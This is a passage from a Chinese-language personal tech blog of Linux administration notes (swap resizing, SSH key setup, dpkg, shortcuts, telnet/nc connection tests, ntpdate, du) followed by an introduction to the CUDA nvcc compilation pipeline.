<li>使用方法：在终端中执行以下命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ldd /path/to/executable</span><br></pre></td></tr></table></figure></li>
<li>返回结果中的描述部分通常包含架构和平台信息。</li>
</ul>
</li>
<li>objdump 命令<ul>
<li>objdump 是一个强大的反汇编工具，也可以用于查看动态库文件的架构和平台信息。</li>
<li>使用方法：在终端中执行以下命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -f /path/to/library.so</span><br></pre></td></tr></table></figure></li>
<li>返回结果中的 “file format” 和 “architecture” 字段表示架构信息，“attributes for” 字段表示平台信息。</li>
</ul>
</li>
</ul>
</li>
<li><p>区分程序对应的架构和适用的平台</p>
<ul>
<li>通过查看可执行程序和动态库文件的架构信息，我们可以确定文件的位数和指令集类型。常见的架构包括 x86、x86_64、ARM 和 MIPS 等。根据不同的架构，可以选择相应的编译工具和库文件进行开发和调试。平台信息则指明文件所适用的操作系统和硬件平台，如 Linux、Windows、macOS、Android 和 iOS 等。根据平台信息，我们可以选择合适的操作系统和运行环境来部署和运行程序。</li>
</ul>
</li>
<li><p>总结</p>
<ul>
<li>了解可执行程序和动态库文件的架构和平台信息对于软件开发和系统调试至关重要。本文介绍了几种常用的方法来查看文件的架构和平台信息，包括 file、readelf、ldd 和 objdump 等命令。同时，根据架构信息和平台信息，我们可以选择合适的编译工具、库文件和运行环境。通过掌握这些方法和技巧，我们能够更好地理解和处理软件和系统，确保软件的正确性和性能。</li>
</ul>
</li>
</ul>
<h2 id="ubuntu-修改swap大小"><a href="#ubuntu-修改swap大小" class="headerlink" title="ubuntu 修改swap大小"></a>ubuntu 修改swap大小</h2><p>要修改Ubuntu上的swap大小，可以通过以下步骤进行操作。请注意，这些步骤可能会导致数据丢失或系统故障，因此在进行任何更改之前，请确保备份重要数据。</p>
<ol>
<li><p><strong>检查当前的swap大小：</strong><br>使用以下命令检查当前的swap分区和大小：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapon --show</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -h</span><br></pre></td></tr></table></figure>

<p>这将显示当前的swap使用情况。</p>
</li>
<li><p><strong>禁用swap：</strong><br>在修改swap之前，最好先禁用swap分区：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapoff -a</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>删除旧的swap文件或分区：</strong><br>如果您的swap是通过文件创建的，可以删除旧的swap文件。如果是分区，则跳过此步骤。</p>
<ul>
<li><p>删除swap文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /swapfile</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>创建新的swap文件或分区：</strong><br>根据您的需求，您可以选择创建新的swap文件或调整分区大小。</p>
<ul>
<li><p><strong>创建swap文件：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> fallocate -l [新的swap大小]G /swapfile</span><br></pre></td></tr></table></figure>

<p>其中，[新的swap大小]是您想要的新swap大小，以G为单位。例如，如果您希望将swap大小更改为4GB，将[新的swap大小]替换为4。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 600 /swapfile</span><br><span class="line"><span class="built_in">sudo</span> mkswap /swapfile</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>创建swap分区：</strong><br>如果您要调整swap分区的大小，可以使用磁盘工具（如GParted）进行分区调整。请注意，这可能需要使用Live CD&#x2F;USB。</p>
</li>
</ul>
</li>
<li><p><strong>启用新的swap：</strong><br>对于新的swap文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapon /swapfile</span><br></pre></td></tr></table></figure>

<p>对于新的swap分区，请重启系统。</p>
</li>
<li><p><strong>更新 &#x2F;etc&#x2F;fstab 文件：</strong><br>为了确保在系统重新启动时新的swap设置仍然有效，您需要更新 <code>/etc/fstab</code> 文件。打开这个文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/fstab</span><br></pre></td></tr></table></figure>

<p>在文件中添加一行，指定新的swap文件或分区：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/swapfile none swap sw 0 0</span><br></pre></td></tr></table></figure>

<p>如果使用分区，则更新对应的分区信息。</p>
</li>
<li><p><strong>检查新的swap大小：</strong><br>使用以下命令确保新的swap设置已经生效：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapon --show</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -h</span><br></pre></td></tr></table></figure>

<p>这应该显示新的swap大小。</p>
</li>
<li><p><strong>重启系统：</strong><br>最后，为了确保所有更改都得到应用，请重新启动系统：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure></li>
</ol>
<p>请谨慎执行这些步骤，特别是在生产环境中。如果您不确定如何操作，建议在进行更改之前查阅相关文档或寻求专业建议。</p>
<h2 id="linux-ssh自动化管理"><a href="#linux-ssh自动化管理" class="headerlink" title="linux ssh自动化管理"></a>linux ssh自动化管理</h2><p>在 Linux 中自动化 SSH 管理可以通过多种方式实现，其中一些包括使用 SSH 密钥对、SSH 配置文件、SSH 代理、以及脚本化工具等。</p>
<h3 id="使用-SSH-密钥对"><a href="#使用-SSH-密钥对" class="headerlink" title="使用 SSH 密钥对"></a>使用 SSH 密钥对</h3><ol>
<li><strong>生成 SSH 密钥对</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure></li>
<li><strong>将公钥添加到远程服务器</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id user@remote_host</span><br></pre></td></tr></table></figure></li>
<li><strong>配置 SSH 代理</strong>：<br>可以使用 <code>ssh-agent</code> 和 <code>ssh-add</code> 命令管理 SSH 密钥，避免在每次连接时都输入密码。</li>
</ol>
<h3 id="使用-SSH-配置文件"><a href="#使用-SSH-配置文件" class="headerlink" title="使用 SSH 配置文件"></a>使用 SSH 配置文件</h3><p>SSH 配置文件位于 <code>~/.ssh/config</code>，可以配置各种连接选项。示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host alias_name</span><br><span class="line">    HostName remote_host</span><br><span class="line">    User username</span><br><span class="line">    Port port_number</span><br><span class="line">    IdentityFile /path/to/private_key</span><br></pre></td></tr></table></figure>

<h3 id="使用脚本自动化连接"><a href="#使用脚本自动化连接" class="headerlink" title="使用脚本自动化连接"></a>使用脚本自动化连接</h3><p>可以编写脚本来自动化 SSH 连接和命令执行，例如使用 Bash 或 Python 脚本。这些脚本可以使用 SSH 密钥对进行身份验证，并在需要时执行特定的命令或操作。</p>
<h3 id="使用自动化工具"><a href="#使用自动化工具" class="headerlink" title="使用自动化工具"></a>使用自动化工具</h3><p>有一些专门用于自动化远程连接和管理的工具，例如 Ansible、Fabric 或 Paramiko（Python SSH 库）。这些工具提供了更高级的功能，允许您批量执行命令、配置管理和远程任务等。</p>
<h3 id="一些示例"><a href="#一些示例" class="headerlink" title="一些示例"></a>一些示例</h3><ul>
<li><p><strong>使用 SSH 配置文件简化连接</strong>：<br>在 <code>~/.ssh/config</code> 中定义主机别名和连接参数，使得通过简单别名即可连接。</p>
</li>
<li><p><strong>使用脚本批量执行命令</strong>：<br>编写 Bash 或 Python 脚本，使用 SSH 连接并在多台服务器上执行特定命令。</p>
</li>
<li><p><strong>使用自动化工具进行配置管理</strong>：<br>使用 Ansible 等自动化工具，可以定义剧本 (playbooks)，批量管理多台远程主机的配置和操作。</p>
</li>
</ul>
<p>以上方法可根据需求和环境适用。安全性、灵活性和易用性都是自动化管理中需要考虑的关键因素。</p>
<h2 id="使用-SSH-密钥对来进行身份验证。"><a href="#使用-SSH-密钥对来进行身份验证。" class="headerlink" title="使用 SSH 密钥对来进行身份验证。"></a>使用 SSH 密钥对来进行身份验证。</h2><p>使用 SSH 密钥对进行身份验证是一种更安全和推荐的方式，相比于使用密码，它提供了更强的安全性。以下是使用 SSH 密钥对进行身份验证的基本步骤：</p>
<ol>
<li><p><strong>生成 SSH 密钥对：</strong><br>在本地计算机上生成 SSH 密钥对，包括私钥和公钥。可以使用以下命令生成 SSH 密钥对：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure>

<p>上述命令将生成一个 4096 位的 RSA 密钥对。在执行该命令后，系统会询问您要存储密钥的位置以及是否要设置密码来保护私钥。根据需要进行设置。</p>
</li>
<li><p><strong>将公钥添加到远程服务器：</strong><br>将生成的公钥（通常是 <code>~/.ssh/id_rsa.pub</code>）内容复制到远程服务器的 <code>~/.ssh/authorized_keys</code> 文件中。可以使用以下命令将公钥复制到远程服务器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id user@remote_host</span><br></pre></td></tr></table></figure>

<p>这将会提示您输入远程主机的密码，然后将本地计算机上的公钥添加到远程主机的 <code>authorized_keys</code> 文件中。</p>
</li>
<li><p><strong>验证 SSH 密钥是否工作：</strong><br>使用 SSH 连接到远程服务器，如果一切设置正确，连接时将不再需要输入密码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@remote_host</span><br></pre></td></tr></table></figure>

<p>确保您可以无需输入密码直接登录到远程服务器，这意味着 SSH 密钥对身份验证已经成功。</p>
</li>
</ol>
<p>通过使用 SSH 密钥对，您可以更安全地进行远程连接，同时可以通过密码保护私钥来增加额外的安全性。此外，记住定期更新 SSH 密钥对以及谨慎管理和保护您的私钥非常重要。</p>
<h2 id="ubuntu-apt-查看安装包的库文件和头文件"><a href="#ubuntu-apt-查看安装包的库文件和头文件" class="headerlink" title="ubuntu apt 查看安装包的库文件和头文件"></a>ubuntu apt 查看安装包的库文件和头文件</h2><p>要查看已安装软件包中的库文件和头文件，您可以使用 <code>dpkg -L</code> 命令来查找特定软件包已安装的文件列表。以下是在 Ubuntu 上使用 <code>dpkg -L</code> 来查找已安装软件包中的库文件和头文件的示例：</p>
<h3 id="查看已安装软件包的库文件"><a href="#查看已安装软件包的库文件" class="headerlink" title="查看已安装软件包的库文件"></a>查看已安装软件包的库文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -L libssl-dev</span><br></pre></td></tr></table></figure>

<p>这将显示 <code>libssl-dev</code> 软件包安装的文件列表，其中应包括 OpenSSL 库文件。</p>
<h3 id="查看已安装软件包的头文件"><a href="#查看已安装软件包的头文件" class="headerlink" title="查看已安装软件包的头文件"></a>查看已安装软件包的头文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -L libssl-dev | grep /usr/include/</span><br></pre></td></tr></table></figure>

<p>这将筛选出 <code>libssl-dev</code> 软件包中安装的头文件路径。通常，C&#x2F;C++ 的头文件位于 <code>/usr/include/</code> 目录下。</p>
<p>您可以将 <code>libssl-dev</code> 替换为您想要检查的其他软件包名称，以查找特定软件包已安装的文件列表。这种方法可以帮助您查找软件包中包含的特定文件，以便在编译和开发过程中正确地包含和链接所需的文件。</p>
<h2 id="ubuntu-系统全部快捷键-详解"><a href="#ubuntu-系统全部快捷键-详解" class="headerlink" title="ubuntu 系统全部快捷键 详解"></a>ubuntu 系统全部快捷键 详解</h2><p>Ubuntu系统的全部快捷键在不同版本和桌面环境下可能会有所不同。下面是一些Ubuntu系统常见的全局快捷键及其详细说明，主要针对Ubuntu 20.04及更早版本以及默认的GNOME桌面环境：</p>
<ol>
<li><p><strong>通用快捷键</strong>：</p>
<ul>
<li><code>Ctrl + Alt + Delete</code>：打开系统监视器，允许你终止或重新启动系统。</li>
<li><code>Ctrl + Alt + T</code>：打开终端。</li>
<li><code>Super</code>键（通常是Windows键）：打开应用程序菜单或Dash（Ubuntu的应用启动器）。</li>
<li><code>Super + D</code>：最小化或还原所有窗口，显示桌面。</li>
<li><code>Alt + F2</code>：打开运行命令对话框。</li>
</ul>
</li>
<li><p><strong>窗口管理快捷键</strong>：</p>
<ul>
<li><code>Alt + Tab</code>：切换活动应用程序。</li>
<li><code>Alt + </code>（<code>~</code>键上方的键）：在当前应用程序的窗口之间切换。</li>
<li><code>Super + 数字键</code>：打开或切换到任务栏上的相应应用程序。</li>
<li><code>Super + W</code>：显示所有打开窗口，允许你选择要切换到的窗口。</li>
<li><code>Super + Arrow键</code>：将窗口最大化、最小化或分割到屏幕的一侧。</li>
<li><code>Alt + F4</code>：关闭当前窗口。</li>
</ul>
</li>
<li><p><strong>文本编辑和终端快捷键</strong>：</p>
<ul>
<li><code>Ctrl + C</code>：中断当前进程。</li>
<li><code>Ctrl + Z</code>：将当前进程移到后台。</li>
<li><code>Ctrl + A</code>：将光标移到行首。</li>
<li><code>Ctrl + E</code>：将光标移到行尾。</li>
<li><code>Ctrl + U</code>：删除从光标位置到行首的文本。</li>
<li><code>Ctrl + K</code>：删除从光标位置到行尾的文本。</li>
<li><code>Ctrl + L</code>：清除终端屏幕。</li>
</ul>
</li>
<li><p><strong>文件管理器快捷键</strong>：</p>
<ul>
<li><code>Ctrl + N</code>：打开新窗口。</li>
<li><code>F2</code>：重命名文件或文件夹。</li>
<li><code>Ctrl + H</code>：显示或隐藏隐藏文件和文件夹。</li>
<li><code>Ctrl + L</code>：将焦点切换到地址栏。</li>
<li><code>Ctrl + A</code>：全选文件或文件夹。</li>
</ul>
</li>
<li><p><strong>工作区和多任务处理</strong>：</p>
<ul>
<li><code>Ctrl + Alt + 左/右箭头</code>：切换工作区。</li>
<li><code>Super + S</code>：显示所有工作区和打开窗口，允许你移动窗口到不同的工作区。</li>
</ul>
</li>
</ol>
<p>请注意，不同的桌面环境（如GNOME、KDE、Xfce等）可能会有不同的快捷键配置。此外，你还可以自定义快捷键，具体取决于你使用的桌面环境和个人偏好。要查看更多系统和桌面环境特定的快捷键，可以查阅相关文档或设置界面。</p>
<h2 id="linux-查看连接到本机的ssh客户端有哪些"><a href="#linux-查看连接到本机的ssh客户端有哪些" class="headerlink" title="linux 查看连接到本机的ssh客户端有哪些"></a>linux 查看连接到本机的ssh客户端有哪些</h2><p>要查看连接到Linux服务器的SSH客户端，你可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tnpa | grep <span class="string">&#x27;ESTABLISHED.*ssh&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个命令会显示当前所有建立的SSH连接。其中：</p>
<ul>
<li><code>netstat</code> 是一个网络工具，用于显示各种网络相关信息。</li>
<li><code>-tnpa</code> 选项用于显示TCP连接的信息。</li>
<li><code>grep &#39;ESTABLISHED.*ssh&#39;</code> 用于过滤并仅显示已建立的SSH连接。</li>
</ul>
<p>这将列出所有已建立的 SSH 连接以及它们的相关详细信息，包括远程 IP 地址、本地端口、远程端口等。</p>
<h2 id="linux-使用命令发送tcp请求"><a href="#linux-使用命令发送tcp请求" class="headerlink" title="linux 使用命令发送tcp请求"></a>linux 使用命令发送tcp请求</h2><p>在 Linux 中，你可以使用 <code>telnet</code> 或 <code>nc</code> 命令来发送 TCP 请求。这两个命令都可以用于测试 TCP 连接或发送数据到远程服务器。</p>
<h3 id="使用-telnet-命令："><a href="#使用-telnet-命令：" class="headerlink" title="使用 telnet 命令："></a>使用 telnet 命令：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;服务器地址&gt; &lt;端口号&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 127.0.0.1 80</span><br></pre></td></tr></table></figure>

<p>这将尝试连接到本地主机的 <code>80</code> 端口。连接成功后，你可以手动输入 HTTP 请求或其他内容。退出 telnet 会话可以通过输入 <code>Ctrl+]</code>，然后输入 <code>quit</code> 来完成。</p>
<h3 id="使用-nc-命令："><a href="#使用-nc-命令：" class="headerlink" title="使用 nc 命令："></a>使用 nc 命令：</h3><p><code>nc</code> 命令（也称为 netcat）是一个强大的网络工具，可以用于创建任何类型的连接，包括 TCP 和 UDP 连接。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;服务器地址&gt; &lt;端口号&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 80</span><br></pre></td></tr></table></figure>

<p>连接建立后，你可以手动输入要发送的数据。退出 nc 会话可以通过输入 <code>Ctrl+C</code> 来中断连接。</p>
<p>这两个命令都是非常基本和通用的，用于测试 TCP 连接和发送数据。然而，它们并不提供像 HTTP 请求这样的高级协议功能，仅用于简单的连接和数据交换。</p>
<h2 id="C-如何查看可执行文件是否含有调试信息"><a href="#C-如何查看可执行文件是否含有调试信息" class="headerlink" title="C++ 如何查看可执行文件是否含有调试信息"></a>C++ 如何查看可执行文件是否含有调试信息</h2><p>要检查 C++ 可执行文件是否包含调试信息，可以使用一些工具来查看可执行文件的元数据。在 Linux 环境下，您可以使用 <code>readelf</code> 和 <code>objdump</code> 这样的工具。在 Windows 平台上，您可以使用 <code>dumpbin</code> 工具。</p>
<h3 id="Linux-上使用-readelf-和-objdump"><a href="#Linux-上使用-readelf-和-objdump" class="headerlink" title="Linux 上使用 readelf 和 objdump"></a>Linux 上使用 readelf 和 objdump</h3><ol>
<li><p><strong>readelf</strong>：它是一个用于显示 ELF（Executable and Linkable Format）文件信息的工具。要查看可执行文件的调试信息，可以使用以下命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S your_executable_file</span><br></pre></td></tr></table></figure>

<p> 这会显示文件中各个节（sections）的信息，您可以检查是否有 <code>.debug</code> 或 <code>.debug_*</code> 这样的节存在。这些节通常存储调试信息。</p>
</li>
<li><p><strong>objdump</strong>：这是另一个用于查看可执行文件信息的工具，可以使用以下命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -h your_executable_file</span><br></pre></td></tr></table></figure>

<p> 这将列出文件的各个节的信息，您可以检查是否存在与调试信息相关的节。</p>
</li>
</ol>
<h3 id="Windows-上使用-dumpbin"><a href="#Windows-上使用-dumpbin" class="headerlink" title="Windows 上使用 dumpbin"></a>Windows 上使用 dumpbin</h3><p>在 Windows 上，您可以使用 Visual Studio 提供的 <code>dumpbin</code> 工具来查看可执行文件的信息，包括是否存在调试信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dumpbin /headers your_executable_file</span><br></pre></td></tr></table></figure>

<p>这将显示可执行文件的头部信息，您可以在其中寻找与调试信息相关的部分。</p>
<p>请注意，调试信息在发布版本的可执行文件中通常被剥离以减少文件大小。在生产环境中，通常不会包含调试信息。</p>
<h2 id="如何校准Linux服务器时间"><a href="#如何校准Linux服务器时间" class="headerlink" title="如何校准Linux服务器时间"></a>如何校准Linux服务器时间</h2><ul>
<li><p>Linux查看服务器当前事件</p>
<ul>
<li>查看当前时区: date -R</li>
<li>查看当前日期和时间: date</li>
</ul>
</li>
<li><p>校准Linux服务器时间</p>
<ul>
<li>Linux中有个ntp包可以自动校准时间,安装后可以很方便地校准事件</li>
<li>安装前可以通过 cat &#x2F;proc&#x2F;version 命令查看当前操作系统版本信息</li>
<li>Debian系统安装NTP<ul>
<li>apt-get install ntpdate</li>
</ul>
</li>
<li>CentOS系统安装NTP:<ul>
<li>yun install ntp</li>
</ul>
</li>
</ul>
</li>
<li><p>校准时间命令</p>
<ul>
<li>ntpdate cn.pool.ntp.org</li>
<li>其中,cn.pool.ntp.org是ntp网络授时组织的中国授时源</li>
<li>执行校准命令后,会自动调整时间并显示校正的时间偏移量</li>
</ul>
</li>
<li><p>使用命令 hwclock -w 保存配置,以便重启后时间再次不对</p>
</li>
</ul>
<h2 id="du-sort-head"><a href="#du-sort-head" class="headerlink" title="du + sort + head"></a>du + sort + head</h2><ul>
<li><p>du -a .&#x2F; | sort -nr </p>
<ul>
<li>按照文件从大到小排序(包含隐藏文件,包含目录,文件,层级目录下文件)</li>
</ul>
</li>
<li><p>du -m –max-depth&#x3D;1 .&#x2F; | sort -nr | head -n 10 </p>
<ul>
<li>指定目录第一层,显示前top10</li>
<li>-m : 统计单位为MB</li>
</ul>
</li>
<li><p>du -m –max-depth&#x3D;1 .&#x2F; | sort -nr -o ‘sort.txt’ | head -n 10 </p>
<ul>
<li>使用sort -o 参数将排序结果存入指定文件 sort.txt 中</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-nvcc_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-nvcc_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">nvcc_1_理论基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/NVIDIA/" itemprop="url" rel="index"><span itemprop="name">NVIDIA</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li><p>nvcc是cuda程序的编译器</p>
</li>
<li><p>了解它的一些关键参数有利于我们更加从容，更加准确的构建自己的CUDA项目</p>
</li>
<li><p>Nvcc是一种编译器驱动，通过命令行选项可以在不同阶段启动不同的工具完成编译工作，其目的在于隐藏了复杂的CUDA编译细节，</p>
</li>
<li><p>并且它不是一个特殊的CUDA编译驱动而是在模仿一般的通用编译驱动如gcc，它接受一定的传统编译选项如宏定义，库函数路径以及编译过程控制等</p>
</li>
</ul>
<h2 id="cuda编译文件流程"><a href="#cuda编译文件流程" class="headerlink" title="cuda编译文件流程"></a>cuda编译文件流程</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><ul>
<li>首先是对输入的<code>cu</code>文件有一个预处理过程，这一过程包括的步骤有将该源文件里的宏以及相关引用文件扩展开，然后将预编译已经产生的与<code>C</code>有关的<code>CUDA</code>系统定义的宏扩展开，并合并分支编译的结果</li>
<li><code>CUDA</code>源文件经过预处理过程后会生成具有<code>.cup</code>后缀名的经过预处理的源文件，经过预处理的源文件是再现程序<code>bug</code>的最好形式。</li>
<li>通常，这个预处理过程是隐式完成的，如果想要显示执行，可以用命令<code>nvcc-E x.cu -o x.cup</code>或<code>nvcc -E x.cu &gt; x.cup</code>来实现</li>
</ul>
<h3 id="cudafe-–-前后端设备分离"><a href="#cudafe-–-前后端设备分离" class="headerlink" title="cudafe – 前后端设备分离"></a>cudafe – 前后端设备分离</h3><ul>
<li>预处理后，首先将预处理的结果送给<code>CUDA</code>前端，即<code>CUDAfe</code>.通过CUDAfe分离源文件，然后调用不同的编译器分别编译</li>
<li><code>cudafe</code>被称为<code>CUDAfrontend</code>，会被调用两次，完成两个工作:<ul>
<li>一是,将主机代码与设备代码分离，生成<code>gpu</code>文件</li>
<li>二是,对<code>gpu</code>文件进行<code>deadcode analysis</code>，传给<code>nvopencc</code>，未来的版本可能没有第二次调用</li>
</ul>
</li>
<li>Nvopencc生成ptx文件传给ptxas，最后将cubin或ptx传给fatbin组合成一个设备代码描述符</li>
</ul>
<h3 id="生成编译代码"><a href="#生成编译代码" class="headerlink" title="生成编译代码"></a>生成编译代码</h3><ul>
<li>在编译阶段<code>CUDA</code>源代码对<code>C</code>语言所扩展的部分将被转成<code>regular ANSIC</code>的源文件，也就可以由一般的<code>C</code>编译器进行更多的编译和连接。也即是设备代码被编译成<code>ptx</code>（parallel threadexecution）代码和&#x2F;或二进制代码，</li>
<li><code>host</code>代码则以<code>C</code>文件形式输出，在编译时可将设备代码描述符链接到所生成的<code>host</code>代码，将其中的<code>cubin</code>对象作为全局初始化数据数组包含进来，但此时，<code>kernel</code>执行配置也要被转换为<code>CUDA</code>运行启动代码，以加载和启动编译后的<code>kernel</code></li>
<li>在调用<code>CUDA</code>驱动<code>API</code>时，<code>CUDA</code>运行时系统会查看这个描述符，根据当前的<code>GPU load</code>一块具有合适<code>ISA</code>的<code>image</code>，然后便可单独执行<code>ptx</code>代码或<code>cubin</code>对象，而忽略<code>nvcc</code>编译得到的<code>host</code>代码。 </li>
<li><code>Nvcc</code>的各个编译阶段以及行为是可以通过组合输入文件名和选项命令进行选择的。它是不区分输入文件类型的，如<code>object</code>, <code>library</code> or <code>resource files</code>，仅仅把当前要执行编译阶段需要的文件传递给<code>linker</code>。</li>
</ul>
<h2 id="指定编译阶段"><a href="#指定编译阶段" class="headerlink" title="指定编译阶段"></a>指定编译阶段</h2><ul>
<li>主要指定编译的阶段是最基本的编译参数</li>
<li><code>-ccbin</code> : 指定host编译器所在路径</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-cuda_1_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/NVIDIA/CUDA/2024-05-22-cuda_1_1_%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">cuda_1_1_理论基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
